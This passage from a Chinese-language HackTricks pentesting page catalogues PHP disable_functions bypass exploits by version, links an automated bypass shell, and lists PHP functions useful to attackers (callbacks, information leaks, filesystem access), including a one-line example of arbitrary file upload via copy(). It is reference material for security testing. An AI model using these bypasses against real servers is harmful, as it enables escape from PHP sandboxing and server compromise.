<li><a href="https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/broken-reference/README.md"><strong>使用 FFI - 外部函数接口启用的绕过</strong></a></li>
<li><a href="disable_functions-bypass-via-mem.html"><strong>通过内存绕过</strong></a></li>
<li><a href="disable_functions-bypass-mod_cgi.html"><strong>mod_cgi</strong></a></li>
<li><a href="disable_functions-bypass-php-perl-extension-safe_mode-bypass-exploit.html"><strong>PHP Perl 扩展安全模式</strong></a></li>
<li><a href="disable_functions-bypass-dl-function.html"><strong>dl 函数</strong></a></li>
<li><a href="https://github.com/mm0r1/exploits/tree/master/php-filter-bypass"><strong>此漏洞</strong></a></li>
<li>5.* - 通过对 PoC 进行小幅更改可利用</li>
<li>7.0 - 迄今为止的所有版本</li>
<li>7.1 - 迄今为止的所有版本</li>
<li>7.2 - 迄今为止的所有版本</li>
<li>7.3 - 迄今为止的所有版本</li>
<li>7.4 - 迄今为止的所有版本</li>
<li>8.0 - 迄今为止的所有版本</li>
<li><a href="https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php"><strong>从 7.0 到 8.0 的漏洞（仅限 Unix）</strong></a></li>
<li><a href="disable_functions-bypass-php-7.0-7.4-nix-only.html#php-7-0-7-4-nix-only"><strong>PHP 7.0=7.4 (*nix)</strong></a></li>
<li><a href="disable_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.html"><strong>Imagick 3.3.0 PHP &gt;= 5.4</strong></a></li>
<li><a href="disable_functions-php-5.x-shellshock-exploit.html"><strong>PHP 5.x Shellsock</strong></a></li>
<li><a href="disable_functions-php-5.2.4-ioncube-extension-exploit.html"><strong>PHP 5.2.4 ionCube</strong></a></li>
<li><a href="disable_functions-bypass-php-less-than-5.2.9-on-windows.html"><strong>PHP &lt;= 5.2.9 Windows</strong></a></li>
<li><a href="disable_functions-bypass-php-5.2.4-and-5.2.5-php-curl.html"><strong>PHP 5.2.4/5.2.5 cURL</strong></a></li>
<li><a href="disable_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.html"><strong>PHP 5.2.3 -Win32std</strong></a></li>
<li><a href="disable_functions-bypass-php-5.2-fopen-exploit.html"><strong>PHP 5.2 FOpen 漏洞</strong></a></li>
<li><a href="disable_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl_exec.html"><strong>PHP 4 &gt;= 4.2.-, PHP 5 pcntl_exec</strong></a></li>
</ul>
<h3 id="自动工具"><a class="header" href="#自动工具"><strong>自动工具</strong></a></h3>
<p>以下脚本尝试了一些这里提到的方法：<br />
<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php">https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php</a></p>
<h2 id="其他有趣的-php-函数"><a class="header" href="#其他有趣的-php-函数">其他有趣的 PHP 函数</a></h2>
<h3 id="接受回调的函数列表"><a class="header" href="#接受回调的函数列表">接受回调的函数列表</a></h3>
<p>这些函数接受一个字符串参数，可以用来调用攻击者选择的函数。根据函数的不同，攻击者可能有或没有能力传递参数。在这种情况下，可以使用信息泄露函数，如 phpinfo()。</p>
<p><a href="https://www.php.net/manual/en/language.types.callable.php">回调 / 可调用</a></p>
<p><a href="https://stackoverflow.com/questions/3115559/exploitable-php-functions">从这里开始的后续列表</a></p>
<pre><code class="language-php">// Function =&gt; Position of callback arguments
'ob_start' =&gt; 0,
'array_diff_uassoc' =&gt; -1,
'array_diff_ukey' =&gt; -1,
'array_filter' =&gt; 1,
'array_intersect_uassoc' =&gt; -1,
'array_intersect_ukey' =&gt; -1,
'array_map' =&gt; 0,
'array_reduce' =&gt; 1,
'array_udiff_assoc' =&gt; -1,
'array_udiff_uassoc' =&gt; array(-1, -2),
'array_udiff' =&gt; -1,
'array_uintersect_assoc' =&gt; -1,
'array_uintersect_uassoc' =&gt; array(-1, -2),
'array_uintersect' =&gt; -1,
'array_walk_recursive' =&gt; 1,
'array_walk' =&gt; 1,
'assert_options' =&gt; 1,
'uasort' =&gt; 1,
'uksort' =&gt; 1,
'usort' =&gt; 1,
'preg_replace_callback' =&gt; 1,
'spl_autoload_register' =&gt; 0,
'iterator_apply' =&gt; 1,
'call_user_func' =&gt; 0,
'call_user_func_array' =&gt; 0,
'register_shutdown_function' =&gt; 0,
'register_tick_function' =&gt; 0,
'set_error_handler' =&gt; 0,
'set_exception_handler' =&gt; 0,
'session_set_save_handler' =&gt; array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' =&gt; array(2, 3),
'sqlite_create_function' =&gt; 2,
</code></pre>
<h3 id="信息泄露"><a class="header" href="#信息泄露">信息泄露</a></h3>
<p>大多数这些函数调用不是数据汇聚点。但如果返回的任何数据对攻击者可见，则可能存在漏洞。如果攻击者可以看到 phpinfo()，这绝对是一个漏洞。</p>
<pre><code class="language-php">phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
</code></pre>
<h3 id="其他"><a class="header" href="#其他">其他</a></h3>
<pre><code class="language-php">extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
</code></pre>
<h3 id="文件系统函数"><a class="header" href="#文件系统函数">文件系统函数</a></h3>
<p>根据 RATS，php 中的所有文件系统函数都很糟糕。其中一些对攻击者似乎并不太有用。其他的则比你想象的更有用。例如，如果 allow_url_fopen=On，则可以将 URL 用作文件路径，因此调用 copy($_GET['s'], $_GET['d']); 可以用来在系统上的任何地方上传 PHP 脚本。此外，如果一个站点容易受到通过 GET 发送的请求的攻击，那么所有这些文件系统函数都可以被滥用，以通过你的服务器将攻击引导到另一个主机。</p>
<p><strong>打开文件系统处理程序</strong></p>
<pre><code class="language-php">fopen
tmpfile
bzopen
gzopen
SplFileObject-&gt;__construct
</code></pre>
<p><strong>写入文件系统（部分结合读取）</strong></p>
<pre><code class="language-php">chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
</code></pre>
<p><strong>从文件系统读取</strong></p>
<pre><code class="language-php">file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
</code></pre>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../../network-services-pentesting/pentesting-web/php-tricks-esp/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../../network-services-pentesting/pentesting-web/php-tricks-esp/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../../elasticlunr.min.js"></script>
        <script src="../../../../mark.min.js"></script>
        <script src="../../../../searcher.js"></script>

        <script src="../../../../clipboard.min.js"></script>
        <script src="../../../../highlight.js"></script>
        <script src="../../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
